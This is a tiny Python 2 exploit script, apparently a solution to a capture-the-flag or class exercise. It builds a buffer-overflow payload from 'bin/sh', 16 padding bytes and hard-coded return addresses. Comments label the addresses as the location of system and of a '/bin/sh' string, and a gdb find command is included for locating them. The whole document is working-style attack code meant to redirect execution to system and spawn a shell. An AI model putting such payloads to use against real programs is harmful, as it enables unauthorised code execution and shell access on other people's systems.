from shellcode import shellcode
print "bin/sh"+'A'*16 + '\x30\xa0\x04\x08' +'\x0c\x8f\x04\x08'+ '\xe5\x61\x0c\x08'

#0x804a030 system
#0x80c61e5 bin/sh
#0x08048f0c
#find &system, +99999999, "/bin/sh"